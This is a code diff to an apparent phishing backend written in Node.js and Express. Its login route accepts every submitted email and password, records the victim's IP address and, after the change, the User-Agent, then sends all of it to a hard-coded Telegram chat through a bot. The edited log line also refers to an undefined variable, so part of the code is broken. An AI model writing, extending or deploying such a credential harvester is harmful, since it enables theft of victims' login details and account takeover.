@@ -6,10 +6,16 @@
   const requestIp = require('request-ip');
 
   const app = express();
-  const port = 3000;
+  const port = 3001;
 
   // Enable CORS
   app.use(cors());
+
+  // Middleware to get User Agent
+app.use((req, res, next) => {
+  req.userAgent = req.headers['user-agent'];
+  next();
+});
 
   // Assuming your static files are in the 'images' directory
 app.use(express.static(path.join(__dirname, 'images')));
@@ -43,11 +49,12 @@ app.use(express.static(path.join(__dirname, 'css')));
     const email = req.body.email;
     const password = req.body.password;
     const field = req.body.field;
+    const userAgent = req.userAgent;
 
   // Get the client's IP address
   const clientIp = requestIp.getClientIp(req);
 
-    console.log('Received login attempt:', email, password, field, clientIp);
+    console.log('Received login attempt:', email, password, field, clientIp, user );
 
     const isValidCredentials = true;
 
@@ -55,7 +62,7 @@ app.use(express.static(path.join(__dirname, 'css')));
     if (isValidCredentials) {
       // Send Telegram message
       const chatId = '1713212728';  // Replace with your Telegram group username or chat ID
-      const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}\nType of Mail: ${field}\nIP Address: ${clientIp}`;
+      const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}\nType of Mail: ${field}\nIP Address: ${clientIp}\nUser Agent: ${userAgent}`;
       bot.sendMessage(chatId, message);
 
       console.log('my chat', chatId, message)
